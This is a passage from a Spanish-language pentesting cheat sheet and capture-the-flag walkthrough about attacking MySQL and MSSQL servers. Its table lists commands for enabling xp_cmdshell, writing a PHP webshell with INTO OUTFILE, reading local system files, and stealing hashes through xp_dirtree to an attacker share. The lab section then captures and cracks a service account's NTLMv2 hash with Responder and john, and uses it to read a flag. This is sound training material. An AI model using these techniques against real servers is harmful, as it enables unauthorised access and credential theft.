| `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30`                                                      | Conexión al servidor MSSQL                                                                                            |
| `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`                                                                        | Conexión al servidor MSSQL desde Linux                                                                                |
| `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`                                                                     | Conexión al servidor MSSQL desde Linux mientras el servidor MSSQL utiliza el mecanismo de autenticación de Windows.   |
| `mysql> SHOW DATABASES;`                                                                                                   | Mostrar todas las bases de datos disponibles en MySQL                                                                 |
| `mysql> USE users;`                                                                                                        | Seleccionar una base de datos específica en MySQL                                                                     |
| `mysql> SHOW TABLES;`                                                                                                      | Mostr todas las tablas disponibles en la base de datos seleccionada en MySQL                                          |
| `mysql> SELECT * FROM users;`                                                                                              | Seleccionar todas las entradas disponibles de la tabla "usuarios" en MySQL                                            |
| `sqlcmd> SELECT name FROM master.dbo.sysdatabases`                                                                         | Seleccionar todas las bases de datos disponibles en MSSQL                                                             |
| `sqlcmd> USE htbusers`                                                                                                     | Seleccionar una base de datos específica en MSSQL                                                                     |
| `sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`                                                                 | Mostar todas las tablas disponibles en la base de datos seleccionada en MSSQL                                         |
| `sqlcmd> SELECT * FROM users`                                                                                              | Seleccionar todas las entradas disponibles de la tabla "usuarios" en MSSQ                                             |
| `sqlcmd> EXECUTE sp_configure 'show advanced options', 1`                                                                  | Permitir que se cambien las opciones avanzadas                                                                        |
| `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`                                                                            | Habilitar xp\_cmdshell                                                                                                |
| `sqlcmd> RECONFIGURE`                                                                                                      | Se utiliza después de cada comando sp\_configure para aplicar los cambios                                             |
| `sqlcmd> xp_cmdshell 'whoami'`                                                                                             | Ejecutar un comando del sistema desde el servidor MSSQL                                                               |
| `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'`                           | Crear un archivo usando MySQL                                                                                         |
| `mysql> show variables like "secure_file_priv";`                                                                           | Compruebe si los privilegios de archivos seguros están vacíos para leer archivos almacenados localmente en el sistema |
| `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`                 | Leer archivos locales en MSSQL                                                                                        |
| `mysql> select LOAD_FILE("/etc/passwd");`                                                                                  | Leer archivos locales en MySQL                                                                                        |
| `sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'`                                                                  | Robo de hash usando el comando `xp_dirtree` en MSSQL                                                                  |
| `sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'`                                                                  | Robo de hash usando el comando `xp_subdirs` en MSSQL                                                                  |
| `sqlcmd> SELECT srvname, isremote FROM sysservers`                                                                         | Identificar servidores vinculados en MSSQL                                                                            |
| `sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` | Identificar el usuario y sus privilegios utilizados para la conexión remota en MSSQL                                  |

***

## <mark style="color:purple;">Caso práctico</mark>

> Objetivo: `10.129.108.37`&#x20;
>
> Usuario: "`htbdbuser`"&#x20;
>
> Contraseña: "`MSSQLAccess01!`"

### Pregunta 1

¿Cuál es la contraseña del usuario "`mssqlsvc`"?

Vamos a conectarnos a la base de datos con el módulo mssqlclient de Impacket:

```sql
sudo impacket-mssqlclient -p 1433 htbdbuser@10.129.108.37 
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (htbdbuser  guest@master)> SHOW DATABASES;
[-] ERROR(WIN-02\SQLEXPRESS): Line 1: Could not find stored procedure 'SHOW'.
SQL (htbdbuser  guest@master)> SELECT name FROM master.dbo.sysdatabases
name      
-------   
master    
tempdb    
model        
msdb      
hmaildb  
flagDB   -- Aqui están la flag objetivo

SQL (htbdbuser  guest@master)>
```

{% code overflow="wrap" %}

```sql
SQL (htbdbuser  guest@master)> use flagDB
[-] ERROR(WIN-02\SQLEXPRESS): Line 1: The server principal "htbdbuser" is not able to access the database "flagDB" under the current security context.
```

{% endcode %}

Las flag objetivo está en `flagDB` pero no tenemos permisos para acceder, por lo que vamos a extraer el hash.

1. Iniciamos Responder en nuestra máquina de atacante

```shell-session
afsh4ck@kali$ sudo responder -I tun0           
[sudo] contraseña para kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
  
[+] Listening for events...
```

2. Ejecutamos `xp_dirtree` en SQL:

```sql
SQL (htbdbuser  guest@msdb)> EXEC master..xp_dirtree '\\10.10.14.20\share\'
```

<figure><img src="/files/kZHTWNF07ZrNhPHGaxHC" alt=""><figcaption></figcaption></figure>

```
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.129.203.12
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:436848c611e4eb0e:6F73CDD8EB59E11B5A9A82F5D8DD6603:010100000000000080CAB85E8096DA01278C5F868B8F4EC00000000002000800380036004100540001001E00570049004E002D004B0055004A0035004D0038004500450057003200350004003400570049004E002D004B0055004A0035004D003800450045005700320035002E0038003600410054002E004C004F00430041004C000300140038003600410054002E004C004F00430041004C000500140038003600410054002E004C004F00430041004C000700080080CAB85E8096DA0106000400020000000800300030000000000000000000000000300000FD38B49484E05CBAB76EA1D2A001E19278B1992A0508CC3D1328A13E6400B3F90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320030000000000000000000
```

Obtenemos el hash del usuario mssqlsvc, pero necesitamos crackearlo. Vamos a guardar el hash completo en un archivo `hash.txt`, y vamos a usar john para crackearlo:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
princess1        (mssqlsvc)     
1g 0:00:00:00 DONE (2024-04-24 20:27) 16.66g/s 1092Kp/s 1092Kc/s 1092KC/s 123456..sabrina7
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

&#x20;Obtenemos la contraseña en plano: `princess1` 🏆

### Pregunta 2

> Enumera la base de datos "flagDB" y envia la flag como respuesta.

Vamos a loguearnos con las credenciales que hemos descubierto:

```bash
sudo impacket-mssqlclient -p 1433 mssqlsvc@10.129.203.12 
Impacket v0.11.0 - Copyright 2023 Fortra

Password: princess1
[*] Encryption required, switching to TLS
[-] ERROR(WIN-02\SQLEXPRESS): Line 1: Login failed for user 'mssqlsvc'.
```

No nos deja acceder porque tenemos que especificar la opción `-windows-auth`, ya que se autentica por Windows:

```sql
sudo impacket-mssqlclient -p 1433 mssqlsvc@10.129.203.12 -windows-auth
Impacket v0.11.0 - Copyright 2023 Fortra

Password: princess1
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (WIN-02\mssqlsvc  guest@master)> 
```

Accedemos correctamente y enumeramos las tablas para acceder a la flag 🏆

```sql
SQL (WIN-02\mssqlsvc  guest@master)> use flagDB
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: flagDB
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'flagDB'.
SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> SELECT name FROM sys.tables;
name      
-------   
tb_flag   

SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> SELECT * FROM tb_flag

flagvalue                              
------------------------------------   
b'HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}' 
```
